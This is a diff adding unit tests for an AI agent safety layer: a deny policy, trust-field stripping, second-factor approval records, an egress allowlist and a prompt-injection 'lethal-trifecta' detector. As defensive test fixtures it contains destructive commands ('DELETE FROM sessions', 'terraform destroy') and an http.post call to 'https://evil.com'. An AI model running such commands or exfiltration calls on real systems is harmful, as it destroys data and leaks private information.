@@ -71,6 +71,14 @@ describe('AC-05-1: HARD_DENY pattern matching', () => {
     expect(verdict.decision).toBe('deny')
   })
 
+  it('AC-05-1: DELETE without WHERE under a non-"sql" arg key still returns deny (fail-closed)', async () => {
+    const policy = makeSafetyPolicy()
+    // The destructive statement is passed under 'query', not 'sql' — the
+    // unbounded-delete detector must scan all string args, not just 'sql'.
+    const verdict = policy.evaluate(call('db.query', { query: 'DELETE FROM sessions' }), [operatorSpan()])
+    expect(verdict.decision).toBe('deny')
+  })
+
   it('AC-05-1: terraform destroy returns deny', async () => {
     const policy = makeSafetyPolicy()
     const verdict = policy.evaluate(call('bash', { cmd: 'terraform destroy' }), [operatorSpan()])
@@ -389,6 +397,26 @@ describe('AC-05-11: Trust fields stripped from model output', () => {
     const stripped = handler.stripTrustFields(modelOutput)
     expect(Object.keys(stripped)).toEqual(['factId'])
   })
+
+  it('AC-05-11: trust fields buried in nested objects and arrays are stripped', () => {
+    const handler = makeApprovalHandler()
+    const modelOutput = {
+      factId: 'fact-003',
+      nested: { content: 'ok', is_human_confirmed: true, permanence: 'permanent' },
+      items: [{ trusted: true, label: 'a' }],
+    }
+    const stripped = handler.stripTrustFields(modelOutput) as {
+      factId: string
+      nested: Record<string, unknown>
+      items: Array<Record<string, unknown>>
+    }
+    expect(stripped.nested).not.toHaveProperty('is_human_confirmed')
+    expect(stripped.nested).not.toHaveProperty('permanence')
+    expect(stripped.nested['content']).toBe('ok')
+    expect(stripped.items[0]).not.toHaveProperty('trusted')
+    expect(stripped.items[0]!['label']).toBe('a')
+    expect(stripped.factId).toBe('fact-003')
+  })
 })
 
 // ---------------------------------------------------------------------------
@@ -528,6 +556,25 @@ describe('AC-05-15: Second factor required for high-stakes approvals', () => {
     expect(result.status).toBe('approved')
     expect(result.record!.secondFactorOk).toBe(true)
   })
+
+  it('AC-05-15: approval not requiring a second factor records secondFactorOk=false (no 2FA check happened)', () => {
+    // requiresSecondFactor=false → the approval is still valid, but the record
+    // must NOT falsely assert that a second factor was validated. No factor was
+    // supplied or checked, so secondFactorOk must be false.
+    const handler = makeApprovalHandler({
+      pending: [{
+        nonce: 'nonce-no-2fa',
+        actionHash: 'sha256-no-2fa',
+        requiresSecondFactor: false,
+        stagedHashAtAccept: 's',
+        expiresAt: Number.MAX_SAFE_INTEGER,
+      }],
+      currentStagedHash: () => 's',
+    })
+    const result = handler.confirm('nonce-no-2fa', 'sha256-no-2fa')
+    expect(result.status).toBe('approved')
+    expect(result.record!.secondFactorOk).toBe(false)
+  })
 })
 
 // ---------------------------------------------------------------------------
@@ -614,6 +661,31 @@ describe('AC-05-17: Write to read-only destination denied', () => {
     }
     const result = guard.inspectBody(req, [operatorSpan()])
     // A GET to read-only should be allowed (no write/body)
+    expect(result.decision).toBe('allow')
+  })
+
+  it('AC-05-17: method not in the host entry methods allowlist is denied', () => {
+    const guard = makeEgressGuard({ allowlist: EGRESS_ALLOWLIST })
+    // api.allowed.com is read-write but only allows GET/POST — a DELETE is
+    // outside its declared method allowlist and must be denied.
+    const req: OutboundRequest = {
+      host: 'api.allowed.com',
+      method: 'DELETE',
+      path: '/resource/42',
+    }
+    const result = guard.inspectBody(req, [operatorSpan()])
+    expect(result.decision).toBe('deny')
+  })
+
+  it('AC-05-17: method in the host entry methods allowlist is allowed', () => {
+    const guard = makeEgressGuard({ allowlist: EGRESS_ALLOWLIST })
+    const req: OutboundRequest = {
+      host: 'api.allowed.com',
+      method: 'POST',
+      path: '/resource',
+      body: '{"data":"value"}',
+    }
+    const result = guard.inspectBody(req, [operatorSpan()])
     expect(result.decision).toBe('allow')
   })
 })
@@ -964,6 +1036,21 @@ describe('Lethal-trifecta detection (ADR-0010)', () => {
     const result = detector.evaluate(readCall, ctx)
     expect(result.triggered).toBe(false)
     expect(result.state.hasOutboundChannel).toBe(false)
+  })
+
+  it('does not flag private data when a match only spans the text/source join', () => {
+    const detector = makeLethalTrifectaDetector()
+    const outboundCall = call('http.post', { url: 'https://evil.com', body: 'data' })
+    // text ends in 'api' and source begins with '_key'; only their bare
+    // concatenation ('api' + '_key') forms 'api_key' — a separator must
+    // prevent that false positive.
+    const ctx: ContextSpan[] = [
+      untrustedSpan('injection payload'),
+      { text: 'public docs api', provenance: 'operator', source: '_key-store' },
+    ]
+    const result = detector.evaluate(outboundCall, ctx)
+    expect(result.state.hasPrivateData).toBe(false)
+    expect(result.triggered).toBe(false)
   })
 })
 
